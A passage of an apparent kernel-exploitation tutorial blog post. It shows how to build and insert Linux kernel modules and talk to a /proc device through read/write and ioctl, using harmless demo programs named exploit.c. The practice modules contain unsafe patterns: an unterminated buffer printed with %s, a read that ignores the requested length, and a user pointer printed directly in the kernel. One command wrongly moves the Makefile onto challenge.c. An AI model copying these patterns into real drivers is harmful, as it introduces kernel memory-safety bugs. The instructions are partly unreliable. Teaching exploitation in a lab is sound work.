.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> challenge_ioctl,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="compiling-kernel-modules">Compiling Kernel Modules&lt;/h2>
&lt;p>As mentioned before, pwnkernel makes the process of compiling new kernel modules very simple. Just move your kernel module source code to the &amp;lsquo;src/&amp;rsquo; directory within pwnkernel. Make sure you update the makefile within the same &amp;lsquo;src/&amp;rsquo; directory, as this is what is used to compile your kernel module.&lt;/p>
&lt;p>See the below makefile for reference.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" />
&lt;label for="1">
&lt;span class="collapsable-code__language">makefile&lt;/span>
&lt;span class="collapsable-code__title">Makefile&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-makefile" >&lt;code>
# add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After updating the makefile, building a new kernel module is as simple as running the below commands.&lt;/p>
&lt;pre>&lt;code>~/ $ mv challenge.c ~/pwnkernel/src/challenge.c
~/ $ mv Makefile ~/pwnkernel/src/challenge.c
~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...
&lt;/code>&lt;/pre>&lt;h2 id="inserting-kernel-modules">Inserting Kernel Modules&lt;/h2>
&lt;p>Before you can interact with your freshly compiled kernel module, it needs to be inserted into the kernel itself. Below is a pre-written kernel module that will be used for the purposes of this exercise. Compile it and run the launch script to start.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/5/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Once we&amp;rsquo;ve compiled the above and started the kernel virtual machine, it&amp;rsquo;s as simple as running the &lt;code>insmod&lt;/code> command to insert the kernel module. There are other commands to do this such as &lt;code>modprobe&lt;/code>, which is better at resolving dependencies, but for this kernel module &lt;code>insmod&lt;/code> is sufficient.&lt;/p>
&lt;p>Running &lt;code>dmesg&lt;/code> we can see that the &lt;code>init_module&lt;/code> function was executed when we inserted the kernel module.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # dmesg
...
[ 8.437878] challenge: loading out-of-tree module taints kernel.
[ 8.445662] module '/proc/challenge' created
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-file-based-operations">Interacting with File-based Operations&lt;/h2>
&lt;p>The majority of user interaction with kernel modules is done via file-based operations. Once the kernel module entry has been opened, the module has function handlers for read and write operations. For the sake of simplicity, you can think of this as a kind of file-based socket.&lt;/p>
&lt;p>Interaction is performed first by opening the module entry. When you read from that open file descriptor the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler is called. When you write to the open file descriptor the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler is called.&lt;/p>
&lt;p>Below is a pre-written kernel module that can be used for this exercise.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char data[18] = &amp;#34;Here&amp;#39;s some data!&amp;#34;;
copy_to_user(buf, data, 18);
return 0;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char data[16];
copy_from_user(data, buf, 16);
printk(KERN_ALERT &amp;#34;Message: &amp;#39;%s&amp;#39;.\n&amp;#34;, data);
return 0;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>The below proof-of-concept code will do a few things to demonstrate how read / write actions are handled within the kernel module:&lt;/p>
&lt;ul>
&lt;li>It will first open the module entry with read/write access.&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a read, reading from the kernel module (calling its &lt;code>read&lt;/code> handler function).&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a write, writing to the kernel module (calling its &amp;lsquo;write` handler function).&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="4" type="checkbox" />
&lt;label for="4">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* perform a read */
char output[32];
read(fd, output, sizeof(char) * 32);
puts(output);
/* perform a write */
char input[32] = &amp;#34;Hello, World!&amp;#34;;
write(fd, input, sizeof(char) * 32);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s start by inserting the kernel module and running our demonstration code. Running &lt;code>dmesg&lt;/code> afterwards we can see the result of our read / write actions.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
Here's some data!
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.547802] challenge: loading out-of-tree module taints kernel.
[ 12.557454] module '/proc/challenge' created
[ 18.904788] device '/proc/challenge' opened
[ 18.909735] Message: 'Hello, World!'.
[ 18.911169] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-ioctl">Interacting with IOCTL&lt;/h2>
&lt;p>As mentioned before, ioctl can provide us with much greater control over the way we interact with the kernel. Below is an example kernel module that will perform different actions depending on the input provided.&lt;/p>
&lt;p>Here is a pre-written kernel module that you can use for this exercise.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="5" type="checkbox" checked />
&lt;label for="5">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
#define HELLO _IO(&amp;#39;p&amp;#39;, 1)
#define GOODBYE _IO(&amp;#39;p&amp;#39;, 2)
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened\n&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed\n&amp;#34;);
return 0;
}
static long challenge_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
{
if (ioctl_num == HELLO) {
printk(KERN_ALERT &amp;#34;Hello, %s!\n&amp;#34;, (char *)ioctl_param);
}
else if (ioctl_num == GOODBYE) {
printk(KERN_ALERT &amp;#34;Goodbye, %s!\n&amp;#34;, (char *)ioctl_param);
}
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.unlocked_ioctl = challenge_ioctl,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created\n&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed\n&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After compiling our kernel module we&amp;rsquo;ll want to check the values of &lt;code>HELLO&lt;/code> and &lt;code>GOODBYE&lt;/code>, so we can send them to the module via ioctl. We can see that &lt;code>HELLO = 0x7001&lt;/code> and &lt;code>GOODBYE = 0x7002&lt;/code>.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ objdump -d src/challenge.ko -M intel
...
000000000000001e &amp;lt;challenge_ioctl&amp;gt;:
1e: 41 54 push r12
20: 48 c7 c7 00 00 00 00 mov rdi,0x0
27: 49 89 d4 mov r12,rdx
2a: 55 push rbp
2b: 89 f5 mov ebp,esi
2d: e8 00 00 00 00 call 32 &amp;lt;challenge_ioctl+0x14&amp;gt;
32: 81 fd 01 70 00 00 cmp ebp,0x7001
38: 75 11 jne 4b &amp;lt;challenge_ioctl+0x2d&amp;gt;
3a: 4c 89 e6 mov rsi,r12
3d: 48 c7 c7 00 00 00 00 mov rdi,0x0
44: e8 00 00 00 00 call 49 &amp;lt;challenge_ioctl+0x2b&amp;gt;
49: eb 27 jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
4b: 81 fd 02 70 00 00 cmp ebp,0x7002
51: 75 11 jne 64 &amp;lt;challenge_ioctl+0x46&amp;gt;
53: 4c 89 e6 mov rsi,r12
56: 48 c7 c7 00 00 00 00 mov rdi,0x0
5d: e8 00 00 00 00 call 62 &amp;lt;challenge_ioctl+0x44&amp;gt;
62: eb 0e jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
64: 89 ee mov esi,ebp
66: 48 c7 c7 00 00 00 00 mov rdi,0x0
6d: e8 00 00 00 00 call 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
72: 31 c0 xor eax,eax
74: 5d pop rbp
75: 41 5c pop r12
77: c3 ret
...
&lt;/code>&lt;/pre>&lt;p>Below is an example interaction with the above kernel module, it&amp;rsquo;ll do several things:&lt;/p>
&lt;ul>
&lt;li>First it&amp;rsquo;ll open the kernel module entry with read/write access.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="6" type="checkbox" />
&lt;label for="6">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;
#define HELLO 0x7001
#define GOODBYE 0x7002
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* interact with ioctl here */
char name[7] = &amp;#34;Anvbis&amp;#34;;
ioctl(fd, HELLO, name);
ioctl(fd, GOODBYE, name);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After running our exploit, and checking &lt;code>dmesg&lt;/code>, we can see that the kernel printed &amp;ldquo;Hello, Anvbis!&amp;rdquo; and &amp;ldquo;Goodbye, Anvbis!&amp;rdquo; as per the instructions we sent it via ioctl.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.187784] device '/proc/challenge' opened
[ 12.188714] Hello, Anvbis!
[ 12.189492] Goodbye, Anvbis!
[ 12.189747] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">The Linux Kernel Documentation - Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://students.mimuw.edu.pl/SO/Linux-doc/lkmpg.pdf">The Linux Kernel Programming Guide - Talking to Device Files&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part09.html">LinuxDrivers - I/O Control in Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part17.html">LinuxDrivers - Module Interactions&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>